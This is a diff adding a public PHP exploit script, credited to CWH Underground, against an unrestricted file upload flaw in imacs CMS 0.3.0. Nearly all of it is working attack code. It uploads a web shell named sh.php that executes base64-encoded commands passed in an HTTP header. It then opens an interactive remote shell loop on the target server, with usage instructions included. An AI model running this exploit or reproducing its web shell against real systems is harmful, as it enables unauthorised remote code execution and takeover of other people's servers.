@@ -1,0 +1,130 @@
+<?php
+ 
+/*
+ 
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /        
+  / XXXXXX /
+ (________(          
+  `------'
+  
+ Exploit Title   : imacs CMS Unrestricted File Upload Exploit
+ Date            : 18 June 2013
+ Exploit Author  : CWH Underground
+ Site            : www.2600.in.th
+ Vendor Homepage : http://jrcmsdev.sourceforge.net/
+ Software Link   : http://jaist.dl.sourceforge.net/project/jrcmsdev/imacs_V0_3_0_608.cmp.zip
+ Version         : 0.3.0
+ Tested on       : Window and Linux
+  
+  
+#####################################################
+VULNERABILITY: Unrestricted File Upload 
+#####################################################
+  
+/src/assets/mng/mng.php
+ 
+#####################################################
+DESCRIPTION
+#####################################################
+  
+Restricted access to this script isn't properly realized (Don't require authentication) ,  
+so an attacker might be able to upload arbitrary files containing malicious PHP code due to uploaded file 
+extension isn't properly checked.
+ 
+
+#####################################################
+EXPLOIT
+#####################################################
+  
+*/
+ 
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die("\n[-] No response from {$host}:80\n");
+  
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+ 
+print "\n==============================================\n";
+print "  imacs CMS Unrestricted File Upload Exploit  \n";
+print "                                              \n";
+print "        Discovered By CWH Underground         \n";
+print "==============================================\n\n";
+print "  ,--^----------,--------,-----,-------^--,   \n";
+print "  | |||||||||   `--------'     |          O   \n";
+print "  `+---------------------------^----------|   \n";
+print "    `\_,-------, _________________________|   \n";
+print "      / XXXXXX /`|     /                      \n";
+print "     / XXXXXX /  `\   /                       \n";
+print "    / XXXXXX /\______(                        \n";
+print "   / XXXXXX /                                 \n";
+print "  / XXXXXX /   .. CWH Underground Hacking Team ..  \n";
+print " (________(                                   \n";
+print "  `------'                                    \n\n";
+
+  
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /imacs/\n";
+    die();
+}
+ 
+$host = $argv[1];
+$path = $argv[2];
+ 
+
+$payload  = "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"upload\"; filename=\"sh.php\"\r\n";
+$payload .= "Content-Type: application/octet-stream\r\n\r\n";
+$payload .= "<?php error_reporting(0); print(___); passthru(base64_decode(\$_SERVER[HTTP_CMD]));\r\n";
+$payload .= "--o0oOo0o--\r\n";
+
+$packet  = "GET {$path} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+$response = http_send($host, $packet);
+
+if (!preg_match("/Set-Cookie: ([^;]*);/i", $response, $sid)) die("\n[-] Session ID not found!\n");
+
+$packet  = "POST {$path}src/assets/mng/mng.php?dir= HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: {$sid[1]}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+     
+http_send($host, $packet);
+ 
+$packet  = "GET {$path}content/uploads/sh.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+     
+while(1)
+{
+    print "\nimacs-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+################################################################################################################
+# Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
+################################################################################################################
+?>
